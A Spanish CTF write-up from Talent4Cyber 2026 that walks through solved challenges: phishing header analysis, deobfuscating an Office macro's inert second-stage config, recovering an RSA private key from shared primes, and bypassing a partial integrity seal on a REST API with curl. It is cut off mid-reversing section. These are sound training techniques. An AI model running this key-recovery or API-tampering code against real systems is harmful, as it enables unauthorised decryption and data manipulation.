@@ -1,0 +1,1171 @@
+---
+tags: [ctf, talent4cyber, t4c, informe, writeup]
+evento: Talent4Cyber 2026
+fecha: 14 octubre 2026
+---
+
+# 🛡️ Talent4Cyber 2026 — Informe de retos resueltos
+
+> Recopilación técnica de todos los retos completados en sesión, con
+> metodología, comandos exactos y flags. Pensado como referencia para el
+> equipo y como material de repaso para DEADFACE.
+
+---
+
+## Índice
+
+1. [PIR-04 — Vector de entrada (correo con carga)](#pir-04)
+2. [PIR-01 — Manifiesto cifrado (RSA, primo compartido)](#pir-01)
+3. [Reto06 — ORDOP, ruta desviada (SRTP)](#reto06)
+4. [Interceptación Aérea — material señuelo](#intercept)
+5. [PIR-05 / Reto05 — Persistencia silenciosa (reversing)](#pir-05)
+6. [PIR-08 — Contención del implante](#pir-08)
+7. [Retos pendientes — PIR-02 y PIR-07](#pendientes)
+8. [Tabla resumen de flags y temáticas](#resumen)
+9. [Notas de metodología](#metodologia)
+
+---
+
+## Mapa de temáticas
+
+El evento mezcla categorías clásicas de CTF con las mecánicas propias de
+T4C (terreno compartido, material señuelo, órdenes secretas). Cada reto de
+esta sesión cae en una o dos de estas disciplinas:
+
+| Temática | Qué evalúa | Retos de esta sesión |
+|---|---|---|
+| **Forense digital** | Analizar evidencia ya capturada (correos, ficheros, capturas) sin interactuar con un sistema en vivo | PIR-04 |
+| **Criptografía** | Romper o explotar un esquema criptográfico mal implementado | PIR-01, Reto06 (parcialmente) |
+| **Web / explotación de APIs** | Encontrar y explotar fallos de lógica o integridad en servicios web | Reto06, PIR-02 (pendiente) |
+| **Reversing (ingeniería inversa)** | Desensamblar/decompilar un binario para entender y revertir su lógica | PIR-05 |
+| **Forense de red / señales (RF)** | Analizar una captura de radiofrecuencia o tráfico de red | Interceptación Aérea |
+| **Respuesta a incidentes / Blue Team** | Contener, erradicar o decidir sobre una amenaza ya identificada | PIR-08 |
+| **Sistemas / post-explotación** | Escalada de privilegios y movimiento dentro de un host comprometido | PIR-07 (pendiente) |
+| **Material señuelo** | Reconocer cuándo un material no aporta nada y declararlo (mecánica propia de T4C) | Interceptación Aérea |
+
+---
+
+<a name="pir-04"></a>
+## 1. PIR-04 — ¿Cuál fue el vector de entrada?
+
+**Temática:** Forense digital (correo electrónico) + análisis estático de
+macro de Office. Es el reto típico de "día 1" de un CTF de incident
+response: no hay sistema vivo que tocar, solo evidencia ya recolectada que
+hay que interpretar correctamente.
+
+**Material:** `correo_con_carga.eml`, adjunto `Aviso_Operaciones_MLI.docm`.
+
+**Misión:** acreditar con las cabeceras que el remitente está falsificado,
+y extraer del adjunto la configuración del "segundo estadio" (payload que
+el malware descargaría/instalaría a continuación).
+
+### Enunciado original
+
+> **PIR-04. ¿Cuál fue el vector de entrada?**
+> Se ha recuperado el correo que abrió el ingeniero el 9 de febrero a las
+> 08:14, con su adjunto intacto. A primera vista parece enviado por el
+> departamento de sistemas de la propia empresa.
+> Misión: acreditar a partir de las cabeceras que el remitente está
+> falsificado y extraer del adjunto la configuración del segundo estadio.
+> El material es evidencia, así que analízalo de forma estática. El
+> segundo estadio que vas a recuperar es inerte, pero conviene no perder
+> el hábito.
+> Formato de entrega: `T4C{...}`. Es el valor del campo `marcador` del
+> segundo estadio.
+
+### Parte A — Acreditar la suplantación (cabeceras), paso a paso
+
+**Paso 1. Ver el correo completo en crudo.**
+```bash
+cat correo_con_carga.eml
+```
+o solo las cabeceras relevantes, más rápido de leer:
+```bash
+grep -E "^(From|Return-Path|Reply-To|Received|Message-ID|Authentication-Results):" correo_con_carga.eml
+```
+
+**Paso 2. Entender la diferencia entre cabeceras "cosméticas" y
+cabeceras "de infraestructura".** Esto es lo importante a recordar para
+cualquier análisis de correo futuro:
+- `From:` — lo que el cliente de correo muestra al usuario. El atacante
+  lo escribe literalmente a mano, **no prueba nada por sí solo**.
+- `Return-Path:` — a dónde van los rebotes. Suele coincidir con el
+  dominio real que envió el correo.
+- `Received:` — cada servidor por el que pasó el correo añade una línea
+  propia. **Se leen de abajo hacia arriba** (la más antigua, el origen
+  real, está más abajo en el fichero).
+- `Authentication-Results:` — lo genera el servidor que **recibe** el
+  correo, verificando SPF/DKIM/DMARC contra el dominio del `From`. Si hay
+  varias líneas de este tipo (una por cada salto), solo es fiable la que
+  generó **tu propio servidor** al recibirlo de fuera — cualquier otra
+  que aparezca en saltos intermedios pudo haberla insertado el propio
+  atacante dentro de su infraestructura.
+
+**Paso 3. Localizar la cabecera de autenticación fiable.**
+En este caso, la línea 1 del `.eml`:
+```
+Authentication-Results: mx01.mli-iberia.example; spf=fail (sender IP is 185.203.117.44)
+  smtp.mailfrom=transportes-delta.example; dkim=fail (body hash did not verify)
+  header.d=mli-iberia.example; dmarc=fail action=quarantine header.from=mli-iberia.example
+```
+Es la que genera `mx01.mli-iberia.example` (servidor propio de la
+empresa) al recibir el correo desde fuera → es la fiable. Dice `fail` en
+los tres (SPF, DKIM, DMARC) evaluados contra el dominio del `From`
+(`header.from=mli-iberia.example`).
+
+**Paso 4. Confirmar el origen real con los `Received`.**
+```
+Received: from mail-out-3.transportes-delta.example (185.203.117.44) by mx01.mli-iberia.example ...
+```
+El correo entró en la empresa **desde** `transportes-delta.example`
+(IP `185.203.117.44`) — un dominio ajeno, no de la propia empresa.
+
+**Paso 5. Descartar la cabecera "trampa".**
+Más abajo en el fichero hay otra línea:
+```
+Authentication-Results: mail.mli-iberia.example; spf=pass ...
+```
+Esta parece decir que todo está bien (`pass`), pero el dominio
+(`mail.mli-iberia.example`) es parte de la infraestructura del
+**atacante** (dentro de `transportes-delta.example`), no de la empresa
+real — es una cabecera falsa que el propio atacante insertó para
+despistar. Hay que ignorarla y quedarse solo con la del Paso 3.
+
+**Paso 6. Revisar `Return-Path` y `From` como confirmación final.**
+```
+Return-Path: <bounce+mli@transportes-delta.example>
+From: Sistemas MLI <sistemas@mli-iberia.example>
+```
+El `Return-Path` (dominio real de rebote) apunta a `transportes-delta.example`,
+mientras que el `From` visible dice `mli-iberia.example` — la
+discrepancia confirma la suplantación.
+
+**Conclusión:** el `From` visible está falsificado. El correo se originó
+en `transportes-delta.example` (IP `185.203.117.44`). Vector: **phishing
+por correo con dominio falsificado**, reforzado con ingeniería social
+(presión de "antes del cierre de turno" en el cuerpo del mensaje).
+
+---
+
+### Parte B — Extraer el segundo estadio del adjunto, paso a paso
+
+**Paso 1. Localizar el adjunto dentro del `.eml`.**
+El correo es `multipart/mixed`; el adjunto viene codificado en Base64 en
+un bloque de texto dentro del propio `.eml` (busca
+`Content-Transfer-Encoding: base64`). Se copia ese bloque completo.
+
+**Paso 2. Decodificar el adjunto a fichero binario real.**
+```bash
+echo "UEsDBBQAAAAI...(bloque completo pegado)..." | base64 -d > Aviso_Operaciones_MLI.docm
+```
+(Alternativa más robusta si el `.eml` está completo: `munpack correo_con_carga.eml`
+extrae automáticamente cabeceras, cuerpo y adjuntos decodificados sin
+tener que copiar el bloque a mano.)
+
+**Paso 3. Confirmar que el fichero decodificó bien.**
+```bash
+file Aviso_Operaciones_MLI.docm
+```
+Salida esperada: `Microsoft Word 2007+` (un `.docm`/`.docx` moderno es,
+por dentro, un fichero ZIP — por eso el Base64 empieza por `UEsD...`, que
+es la firma `PK\x03\x04` de ZIP en Base64).
+
+**Paso 4. Analizar las macros de forma estática (sin abrir el documento).**
+```bash
+olevba Aviso_Operaciones_MLI.docm
+```
+Esto vuelca el código VBA de las macros sin ejecutarlas. Si no está
+instalado:
+```bash
+pip install oletools --break-system-packages
+```
+
+**Paso 5. Leer el código de la macro y entender la ofuscación.**
+La macro construye un string por trozos, lo invierte (`StrReverse`) y
+luego lo decodifica como Base64 — un truco simple para que no salte a
+la vista con un `strings` superficial:
+```vba
+Private Function Ensamblar() As String
+    Dim s As String
+    s = s & "==gCulmZgMiC99GdsV3Yw8FN2Mzc0I2XyNzZ0Q3cfBjcjRTb7NENUBSP"
+    ' ... más trozos ...
+    Ensamblar = StrReverse(s)
+End Function
+```
+
+**Paso 6. Reproducir la misma lógica en Python** (invertir + decodificar
+Base64 — el mismo orden que hace la macro):
+```python
+s = "".join([
+  "==gCulmZgMiC99GdsV3Yw8FN2Mzc0I2XyNzZ0Q3cfBjcjRTb7NENUBSP",
+  "gACIy9GZhNmch1mCyVGdhRGcVNmb5NFbhZXYOxFbhJ2bsdEI9ACIgACI",
+  "ggXZ0VXbKQzN3ATLHxUQtkETNBSPgACZhRWa05WZklmCwATOg0DIg8Gb",
+  "hZnclRnbppQZsBXbhhXZuEGdsVGZtMXZ0J3bwNnbhJHdu4GZjBSPgACI",
+  "gACIsFmbhNmCt0SLgkCZhRWasFmbvl2YuVnZg4WazBCLhRWYsVXbpNHK",
+  "gIDIvlGZhR3clBSZkBibvl2YhJXdnlmZu92Yg0SLtAyI",
+])
+import base64
+print(base64.b64decode(s[::-1]).decode())
+```
+
+**Paso 7. Leer el resultado — es el fichero de configuración del segundo
+estadio:**
+```
+# --- configuracion de estadio 2 (simulada, sin funcionalidad) ---
+canal      = cdn.transportes-delta.example
+intervalo  = 900
+identidad  = MLI-ALG-0774
+mutex      = Global\NavalSyncUpdater
+marcador   = T4C{m4cr0_st4g3r_b4s364_0culto}
+# fin
+```
+
+**Paso 8. Conectar las dos partes del reto.** El campo `canal` de este
+fichero coincide con el dominio `transportes-delta.example` de las
+cabeceras del correo — confirma que el correo falsificado (Parte A) y
+este segundo estadio (Parte B) pertenecen al mismo actor/infraestructura.
+
+**✅ Flag:** `T4C{m4cr0_st4g3r_b4s364_0culto}`
+
+---
+
+<a name="pir-01"></a>
+## 2. PIR-01 — ¿Qué se movía realmente en ese contenedor?
+
+**Temática:** Criptografía aplicada — explotación de una debilidad real y
+documentada en generación de claves RSA (primos compartidos por baja
+entropía). Es un reto de "romper el cifrado", no de fuerza bruta: la clave
+privada se reconstruye matemáticamente a partir de dos claves públicas.
+
+**Material:** `clave_proveedor_A.pem`, `clave_proveedor_B.pem`, `manifiesto_carga.enc`.
+
+**Misión:** recuperar la clave privada, descifrar el manifiesto cifrado
+(sobre híbrido RSA-OAEP + AES-256-CBC) y extraer la referencia de envío real.
+
+### Enunciado original
+
+> **PIR-01. ¿Qué se movía realmente en ese contenedor?**
+> Una unidad de reconocimiento ha interceptado tráfico cifrado del
+> proveedor logístico que da servicio al despliegue naval y de
+> infantería. Entre el material hay un manifiesto de carga que no cuadra,
+> porque la referencia de envío declarada en aduana no coincide con la
+> ruta contratada.
+> El proveedor genera su material criptográfico en un appliance de bajo
+> coste durante el arranque del servicio. El equipo de captura adjunta
+> además una segunda clave pública, de otro contrato del mismo proveedor
+> y emitida pocos minutos después. Según dice, la incluye «por si sirve».
+> El parte trae una anotación al margen del analista de guardia que nadie
+> ha verificado. Trátala como cualquier otra fuente sin contrastar.
+> Misión: recuperar la clave privada, descifrar el manifiesto y extraer
+> la referencia de envío real.
+> Formato de entrega: `T4C{...}`. Es la referencia de envío real, tal
+> como aparece en el manifiesto descifrado.
+
+### Conceptos previos (por qué funciona el ataque)
+
+RSA se basa en dos primos grandes, `p` y `q`. La clave pública expone
+`n = p × q` (el "módulo") y un exponente `e` (normalmente `65537`). La
+seguridad depende de que **factorizar `n`** (recuperar `p` y `q` a partir
+de solo `n`) sea computacionalmente inviable para números de 2048 bits.
+
+Pero si un generador de claves tiene **poca entropía al arrancar**
+(típico de dispositivos embebidos baratos), puede reutilizar sin querer
+uno de los dos primos al generar una segunda clave poco después. Si eso
+pasa:
+```
+n_A = p × q_A
+n_B = p × q_B      (mismo p, distinto q)
+```
+Entonces `gcd(n_A, n_B) = p` — el **máximo común divisor** revela el
+primo compartido **sin factorizar nada**, usando el algoritmo de
+Euclides, que es instantáneo incluso con números gigantes. Por eso el
+enunciado insistía en dar una segunda clave pública "por si sirve": sin
+ella, este ataque es imposible.
+
+### Paso 1 — Extraer los módulos de las dos claves públicas
+```bash
+openssl rsa -pubin -in clave_proveedor_A.pem -text -noout -modulus
+openssl rsa -pubin -in clave_proveedor_B.pem -text -noout -modulus
+```
+Esto imprime `Modulus=<hex larguísimo>` para cada clave.
+
+### Paso 2 — Calcular el GCD de los dos módulos (Python)
+```python
+from math import gcd
+import subprocess, re
+
+def get_modulus(path):
+    out = subprocess.run(["openssl","rsa","-pubin","-in",path,
+                           "-text","-noout","-modulus"],
+                          capture_output=True, text=True).stdout
+    return int(re.search(r"Modulus=([0-9A-Fa-f]+)", out).group(1), 16)
+
+nA = get_modulus("clave_proveedor_A.pem")
+nB = get_modulus("clave_proveedor_B.pem")
+
+p = gcd(nA, nB)        # si p != 1, hemos encontrado el primo compartido
+q = nA // p            # el otro primo de la clave A
+assert p * q == nA     # verificación de que la factorización es correcta
+print("p =", p)
+print("q =", q)
+```
+Si `p == 1`, las claves no comparten primo y el ataque no aplica (no fue
+el caso aquí: dio un número enorme distinto de 1).
+
+### Paso 3 — Reconstruir la clave privada completa de A
+Con `p`, `q`, el módulo `n_A` y el exponente público `e = 65537`
+(confirmado con `openssl rsa -pubin -in clave_A.pem -text -noout`, campo
+`Exponent:`), se calcula el exponente privado `d`:
+```python
+e = 65537
+phi = (p-1)*(q-1)          # función totiente de Euler
+d = pow(e, -1, phi)        # inverso modular de e mod phi
+
+from Crypto.PublicKey import RSA
+key = RSA.construct((nA, e, d, p, q))
+open("clave_proveedor_A_PRIVADA.pem","wb").write(key.export_key())
+print(key.export_key().decode())
+```
+(Requiere `pip install pycryptodome --break-system-packages` si no está
+instalado.)
+
+### Paso 4 — Entender el formato del fichero cifrado
+La nota del analista (incluida en el material) explicaba la estructura
+de `manifiesto_carga.enc`:
+```
+[ 256 bytes ] clave de sesión envuelta con RSA-OAEP
+[  16 bytes ] IV
+[   resto   ] cuerpo AES-256-CBC (padding PKCS#7)
+```
+Es un **cifrado híbrido**: RSA solo cifra una clave AES corta (256 bytes
+porque la clave RSA es de 2048 bits); el contenido real del manifiesto va
+cifrado con AES, mucho más rápido para datos grandes.
+
+### Paso 5 — Descifrar el sobre híbrido con la clave privada reconstruida
+```python
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP, AES
+from Crypto.Util.Padding import unpad
+
+priv = RSA.import_key(open("clave_proveedor_A_PRIVADA.pem","rb").read())
+data = open("manifiesto_carga.enc","rb").read()
+
+sobre_rsa = data[:256]          # clave de sesión cifrada con RSA-OAEP
+iv        = data[256:272]       # IV de 16 bytes
+cuerpo    = data[272:]          # resto: cuerpo cifrado con AES-CBC
+
+# 1. Descifrar la clave de sesión AES usando la clave privada RSA
+clave_sesion = PKCS1_OAEP.new(priv).decrypt(sobre_rsa)
+print("Clave de sesión AES:", clave_sesion.hex())
+
+# 2. Usar esa clave de sesión para descifrar el cuerpo con AES-CBC
+cipher_aes = AES.new(clave_sesion, AES.MODE_CBC, iv)
+plano = unpad(cipher_aes.decrypt(cuerpo), AES.block_size)
+print(plano.decode())
+```
+
+### Resultado — manifiesto en claro
+```
+MARITIME LOGISTICS IBERIA S.L. · DIVISIÓN CARGA ESPECIAL
+MANIFIESTO DE CARGA — DOCUMENTO RESERVADO
+...
+PARTIDAS
+  1x  Contenedor 40' HC   MLIU 774139-2   "Material de obra civil"
+...
+OBSERVACIONES DEL DEPARTAMENTO DE OPERACIONES
+La partida MLIU 774139-2 se ha registrado en el sistema público con una
+referencia de envío distinta de la real...
+    REFERENCIA DE ENVÍO REAL: T4C{f4ct0r_c0mun_ENV_4LG_77413}
+```
+
+**✅ Flag:** `T4C{f4ct0r_c0mun_ENV_4LG_77413}`
+
+---
+
+<a name="reto06"></a>
+## 3. Reto06 — ORDOP, alteración del plan de transporte (SRTP)
+
+**Temática:** Explotación web (API REST) con un componente de criptografía
+mal aplicada — un sello de integridad (HMAC/hash) que no cubre todos los
+campos del objeto que protege. Además es un reto **KOTH** (King of the
+Hill): no basta con resolverlo una vez, hay que mantener el control del
+recurso en el tiempo para maximizar puntos, en un grafo compartido por
+todas las células.
+
+**Acceso:** `https://retos.locdynamics.com/reto06/` — Basic Auth con las
+credenciales de la plataforma.
+
+**Misión:** cambiar el nodo de destino de la ruta sin invalidar la
+verificación de integridad, y mantener el cambio activo el mayor tiempo
+posible.
+
+### Enunciado original
+
+> **ORDOP. Alteración del plan de transporte**
+> El plan de transporte de la unidad es un grafo de nodos logísticos
+> protegido con un sello criptográfico de integridad. Hay un único plan,
+> compartido por todas las células activadas.
+> Lo que hagas en él lo verán las demás células, y lo que hagan ellas te
+> afectará a ti. Puedes encontrarte el grafo modificado, restaurado o
+> corrompido a propósito. El sistema registra qué célula hace cada
+> acción, así que interferir está permitido, pero nunca de forma
+> anónima.
+> Cada 45 a 60 minutos el grafo vuelve por sí solo a su estado base. Lo
+> que consigas dentro de esa ventana cuenta aunque luego alguien lo
+> deshaga.
+> Misión: cambiar el nodo de destino de la ruta sin invalidar la
+> verificación de integridad, y mantener el cambio durante la ventana
+> activa.
+> Control del corredor. Mientras el desvío siga en pie y sea tuyo, sumas
+> 1 punto por minuto, hasta un máximo de 15. Ese contador no se reinicia
+> con el grafo: acumula durante toda la jornada, entra en la
+> clasificación oficial y se congela al cerrar la jornada.
+> Formato de entrega: `T4C{...}`. La devuelve el propio servicio cuando
+> acepta el grafo con el destino cambiado.
+
+### Paso 1 — Reconocer el servicio
+Al entrar con el navegador a `https://retos.locdynamics.com/reto06/`, la
+propia interfaz web listaba los endpoints disponibles al pie de página:
+```
+GET /api/grafo   ·   GET /api/esquema   ·   POST /api/grafo   ·   GET /api/ranking
+```
+Y la cinta de avisos del sistema ya daba la pista clave en texto plano:
+*"Sello SHA-256 cubre id,nombre,tipo,lat,lon · destino y prioridad NO
+están en el sello"*.
+
+### Paso 2 — Confirmar la vulnerabilidad con el esquema
+```bash
+curl -s -u <usuario>:<clave> https://retos.locdynamics.com/reto06/api/esquema
+```
+Respuesta:
+```json
+{"sello":{"algoritmo":"sha256(sal + '|' + campos)[:32]",
+"campos":["id","nombre","tipo","lat","lon"],
+"formato_campo":"<clave>=<valor>, unidos por '|', en el orden dado",
+"nota":"La sal es interna. No se publica."}}
+```
+Confirmado: el hash **solo** se calcula sobre 5 campos concretos.
+`destino` y `prioridad` quedan fuera → se pueden cambiar libremente sin
+que el sello deje de ser válido ("integridad parcial").
+
+### Paso 3 — Descargar el grafo actual (con sus sellos ya calculados)
+```bash
+curl -s -u <usuario>:<clave> https://retos.locdynamics.com/reto06/api/grafo
+```
+Esto devuelve un JSON con un array `grafo` de 9 nodos, cada uno con su
+campo `sello` ya calculado por el servidor para los valores actuales de
+`id, nombre, tipo, lat, lon`. **No hace falta calcular el sello
+nosotros**: como no vamos a tocar esos 5 campos, el sello sigue siendo
+válido tal cual lo trae el servidor.
+
+### Paso 4 — Construir el payload modificado
+Se copia el array completo tal cual, y se cambia **solo** el campo
+`"destino"` del nodo `ALG-01` (de su valor original a `"TAN-07"`,
+el desvío pedido). Todos los demás campos, incluido `sello`, se dejan
+exactamente igual.
+
+### Paso 5 — Enviar el POST (primer intento falló, aprendizaje incluido)
+Primer intento, envolviendo el array en un objeto:
+```bash
+curl -s -u <usuario>:<clave> -X POST https://retos.locdynamics.com/reto06/api/grafo \
+  -H "Content-Type: application/json" \
+  -d '{"grafo": [ ... ]}'
+```
+Resultado: `{"error":"se espera una lista de nodos"}` — el servidor
+quiere el **array JSON directamente**, sin envolver.
+
+Segundo intento, correcto:
+```bash
+curl -s -u <usuario>:<clave> -X POST https://retos.locdynamics.com/reto06/api/grafo \
+  -H "Content-Type: application/json" \
+  -d '[
+{"destino":"TAN-07","id":"ALG-01","lat":36.1408,"lon":-5.4562,"nombre":"Terminal Algeciras (APM)","prioridad":1,"sello":"9b6eff7f47d81eb8c87d1a68e82e39e2","tipo":"puerto"},
+{"destino":"ALG-01","id":"ALG-02","lat":36.1432,"lon":-5.4489,"nombre":"Muelle de la Isla Verde","prioridad":2,"sello":"9685c47b10d6d7f3422833afc032ae15","tipo":"puerto"},
+... (resto de los 9 nodos, igual que vinieron en el GET) ...
+]'
+```
+
+### Paso 6 — Confirmar la respuesta
+```json
+{"estado":"plan de transporte actualizado",
+ "aviso":"El desvío queda activo para todos los equipos hasta el próximo reset.",
+ "flag":"T4C{gr4f0_h4sh_p4rc14l_ru74_d3sv14d4}"}
+```
+
+### Mantener la puntuación KOTH (importante, no es "resuelto y ya")
+1 punto/minuto mientras el desvío siga siendo tuyo, máximo 15 por
+ventana, **acumulado durante toda la jornada**. El grafo se resetea solo
+cada 45–60 min, y otro equipo puede sobreescribir tu desvío (terreno
+compartido). Para seguir sumando puntos:
+- Revisar de vez en cuando si el desvío sigue en pie (`GET /api/grafo`
+  y mirar el campo `destino` de `ALG-01`).
+- Si se perdió (reset o lo quitó otro equipo), **repetir el mismo
+  `POST` del Paso 5** para recuperarlo.
+
+**✅ Flag:** `T4C{gr4f0_h4sh_p4rc14l_ru74_d3sv14d4}`
+
+---
+
+<a name="intercept"></a>
+## 4. Interceptación Aérea — material señuelo
+
+**Temática:** Análisis de señales de radiofrecuencia (datos IQ) — pero el
+verdadero aprendizaje del reto es reconocer **cuándo un material es
+señuelo** y no merece más tiempo de análisis, una mecánica específica de
+T4C (declarar correctamente no penaliza; perder tiempo antes de declarar,
+sí). Es el reto "trampa" pensado para enseñar a no sobreanalizar.
+
+**Material:** `captura_rf_dron.wav` (IQ desentrelazado en estéreo),
+`captura_rf_dron.iq` (mismas muestras en crudo), parte de interceptación
+del operador de guardia.
+
+**Misión:** determinar si el material intervenido aporta inteligencia
+explotable; si no, declararlo con la cadena exacta del procedimiento.
+
+### Enunciado original
+
+> **Interceptación Aérea — Material intervenido (sin verificar)**
+> Contacto aéreo no cooperativo sobre el corredor norte, presunto UAS de
+> clase I. Hay doce segundos de grabación utilizable en banda ISM. El
+> equipo de captura no ha podido confirmar la modulación ni el preámbulo
+> y remite el material sin preprocesar.
+> Misión: determinar si este material aporta inteligencia explotable.
+> Recuerda el procedimiento para el material intervenido: si concluyes
+> que no aporta nada, decláralo de forma expresa con la cadena
+> `INTOXICACIÓN CONFIRMADA` y dedica el esfuerzo a otras líneas.
+> Declararlo no penaliza, pero el tiempo que pierdas antes de hacerla, sí.
+> Formato de entrega: `INTOXICACIÓN CONFIRMADA`. Se acepta sin tilde y
+> sin distinguir mayúsculas.
+
+### Paso 1 — Descomprimir y ver qué hay
+```bash
+unzip material_S1-interceptacion-aerea.zip
+# inflating: captura_rf_dron.iq
+# inflating: captura_rf_dron.wav
+# inflating: PARTE_DE_INTERCEPTACION.txt
+```
+
+### Paso 2 — Leer primero el parte (barato, antes de tocar el RF)
+```bash
+cat PARTE_DE_INTERCEPTACION.txt
+```
+El propio parte ya "confesaba" dos veces que algo no cuadraba:
+*"El equipo de captura no ha podido confirmar modulación ni preámbulo. Se
+remite el material tal cual, sin preprocesar"*. Esa es la señal de alerta
+número uno — cuando el propio operador que capturó la señal no puede
+confirmar que sea una señal real, hay que sospechar de entrada.
+
+### Paso 3 — Identificar los ficheros
+```bash
+file captura_rf_dron.iq captura_rf_dron.wav
+```
+```
+captura_rf_dron.iq:  data
+captura_rf_dron.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 48000 Hz
+```
+El `.wav` es una conversión a audio de la captura IQ (canal izquierdo = I,
+canal derecho = Q, según indicaba el parte) — más fácil de analizar
+visualmente que el `.iq` crudo.
+
+### Paso 4 — Mirar los bytes crudos (paso rápido, poco concluyente por sí
+solo)
+```bash
+xxd captura_rf_dron.iq | head -20
+```
+Con datos IQ, mirar los bytes a ojo no permite concluir nada fiable — son
+valores de amplitud, no texto. Sirve solo para ver si hay algo
+obviamente estructurado (no lo había).
+
+### Paso 5 — La prueba que decide: espectrograma
+```bash
+sudo apt install sox        # si no está instalado
+sox captura_rf_dron.wav -n spectrogram -o espectro.png
+xdg-open espectro.png       # o simplemente ábrelo con el visor de imágenes
+```
+Un espectrograma muestra la energía de la señal en frecuencia (eje Y) a
+lo largo del tiempo (eje X). Una señal real deja una **traza
+reconocible** (una línea, una banda, un patrón de pulsos repetidos).
+Ruido deja **manchas uniformes sin estructura**.
+
+### Paso 6 — Interpretar el resultado
+El espectrograma mostró **ruido uniforme en toda la imagen**, sin ninguna
+raya, banda ni patrón de pulsos — exactamente el aspecto de ruido
+aleatorio, no de una señal real. Esto confirma lo que ya sugería el
+parte.
+
+### Paso 7 — Declarar el material (no analizar más)
+Siguiendo el procedimiento exacto que pedía el enunciado, se escribe en
+el campo "Escribe la bandera" de la plataforma:
+```
+INTOXICACIÓN CONFIRMADA
+```
+(también vale sin tilde y en minúsculas: `intoxicacion confirmada`)
+
+**Lección para la próxima vez:** cuando un parte admite explícitamente
+que no pudo confirmar algo básico (modulación, preámbulo, autenticidad),
+es una señal de alerta temprana. Un espectrograma tarda 1 minuto en
+confirmarlo o descartarlo — no merece la pena hacer un análisis más
+profundo (demodulación, etc.) antes de esa comprobación rápida.
+
+**✅ Entrega:** `INTOXICACIÓN CONFIRMADA`
+
+---
+
+<a name="pir-05"></a>
+## 5. PIR-05 — Persistencia silenciosa (reversing)
+
+**Temática:** Ingeniería inversa (reversing) de un binario ELF x86-64
+stripped, con desofuscación de datos en tiempo de ejecución condicionada al
+entorno (técnica de evasión real: el binario "no hace nada" si no detecta
+el hostname correcto, así que ejecutarlo en una VM distinta no revela
+nada). Es de los retos más técnicos de la sesión: combina desensamblado,
+comprensión de un algoritmo de cifrado simple hecho a medida, y
+criptoanálisis (ataque de texto plano conocido) para evitar depender de
+reproducir exactamente la condición de entorno.
+
+**Material:** `persistencia.elf` (stripped, PIE), triaje
+(`etc_hostname.txt`, `ps_aux.txt`, `systemctl_list-timers.txt`, con aviso
+explícito de que el triaje no es fuente fiable al 100%).
+
+**Misión:** desofuscar el binario y acreditar el mecanismo exacto de
+persistencia (ruta y nombre de la unidad instalada).
+
+### Enunciado original
+
+> **PIR-05. ¿Cómo sobrevive el implante a los reinicios?**
+> El adjunto del Reto 4 dejó algo instalado en el servidor de
+> planificación que ha aguantado varios reinicios. Se adjuntan el binario
+> recuperado de `/usr/lib/naval/` y el volcado de triaje que se tomó en
+> caliente antes de aislar el host.
+> Misión: desofuscar el binario y acreditar el mecanismo exacto de
+> persistencia. El EEI es la ruta y el nombre de la unidad instalada.
+> Advertencia: no ejecutes el binario fuera de un entorno controlado. En
+> un equipo distinto del original no hace nada visible, así que
+> ejecutarlo a ciegas tampoco te dará información. El análisis previsto
+> es estático.
+> El volcado de triaje incluye una hipótesis sobre la respuesta, pero se
+> tomó con el sistema ya alterado. Úsala con cautela.
+> Formato de entrega: `T4C{...}` con la ruta completa de la unidad
+> instalada, normalizada así: se quita la barra inicial y cada barra,
+> punto o guion pasa a guion bajo. Por ejemplo, y sin que sea la
+> respuesta, `/usr/lib/foo-bar.service` se entregaría como
+> `T4C{usr_lib_foo_bar_service}`.
+
+### Paso 1 — Descomprimir y leer el material de contexto primero
+```bash
+unzip material_05-persistencia-silenciosa.zip
+cat LEEME.txt
+cat triaje/etc_hostname.txt           # -> srv-planificacion-01
+cat triaje/ps_aux.txt                 # procesos naval-sync y naval-syncd
+cat triaje/systemctl_list-timers.txt  # systemctl list-timers (con nota de
+                                       # "no dar por buena esta salida")
+```
+El propio triaje avisa de que `systemctl_list-timers.txt` podría estar
+manipulado por el implante — es una pista deliberada para no fiarse de
+esa fuente y forzar el análisis del binario.
+
+### Paso 2 — Reconocimiento inicial del binario
+```bash
+file persistencia.elf
+```
+```
+persistencia.elf: ELF 64-bit LSB pie executable, x86-64, ... stripped
+```
+`stripped` = sin tabla de símbolos, no hay nombres de funciones propias
+que ayuden. Seguimos con las cadenas de texto:
+```bash
+strings persistencia.elf
+```
+Solo aparecen nombres de funciones de librería (`gethostname`, `memcmp`,
+`fputs`) y una cadena suelta: `NAVSYNC`. Ninguna ruta de fichero visible
+→ confirma que está ofuscado.
+
+### Paso 3 — Listar las secciones del binario
+```bash
+objdump -h persistencia.elf
+```
+Para ver qué hay en cada una; nos interesa `.rodata` (datos de solo
+lectura — candidato a contener el blob cifrado).
+
+### Paso 4 — Volcar `.rodata` en hexadecimal
+```bash
+objdump -s -j .rodata persistencia.elf
+```
+Primeros bytes: la cadena `NAVSYNC\0` en claro, seguida de 548 bytes
+(`0x224` en hexadecimal) que no forman texto legible — ese es el blob
+cifrado, empezando en la dirección `0x2020`.
+
+### Paso 5 — Desensamblar el binario completo
+```bash
+objdump -d -M intel persistencia.elf > disasm.txt
+grep -n -A 5 -B 5 "memcmp\|gethostname" disasm.txt
+```
+Esto localiza rápidamente la zona de código relevante sin tener que leer
+todo el fichero. A partir de ahí se lee el disassembly instrucción por
+instrucción para entender la lógica (ver más abajo el algoritmo
+reconstruido).
+
+### Paso 6 — El algoritmo, instrucción por instrucción (resumen)
+Leyendo el bloque de ensamblador entre las direcciones `0x1070` y
+`0x1151`:
+
+1. `gethostname()` copia el nombre del host a un buffer.
+2. Se calcula un **hash FNV-1a de 64 bits** del hostname, con constantes
+   propias del binario (no las estándar):
+   - offset basis: `0x14650fb0739d0383`
+   - prime: `0x100000001b3` (este sí es el FNV prime de 64 bits estándar)
+   ```
+   hash = offset_basis
+   para cada byte b del hostname:
+       hash = hash XOR b
+       hash = hash * prime   (mod 2^64)
+   ```
+3. Los 8 bytes del hash (en orden little-endian) se convierten en un
+   array `clave[0..7]` de 8 bytes.
+4. Para cada byte `i` del blob cifrado de 548 bytes:
+   ```
+   clave_byte = clave[i % 8]
+   rotacion   = (i // 8) % 8
+   v = rotl8(clave_byte, rotacion) XOR cifrado[i]
+   plano[i] = (v - i) mod 256
+   ```
+5. Si los primeros 7 bytes de `plano` son exactamente `"NAVSYNC"`
+   (comparado con `memcmp`), el hostname era el correcto y el binario
+   imprime un mensaje de confirmación.
+
